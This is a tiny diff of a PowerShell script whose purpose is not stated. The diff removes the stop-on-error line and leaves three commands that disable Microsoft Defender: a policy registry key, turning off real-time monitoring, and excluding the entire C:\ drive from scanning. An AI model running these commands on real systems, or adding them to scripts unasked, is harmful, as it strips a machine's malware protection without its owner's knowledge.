@@ -1,4 +1,3 @@
-$ErrorActionPreference = "Stop"
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath "C:\"
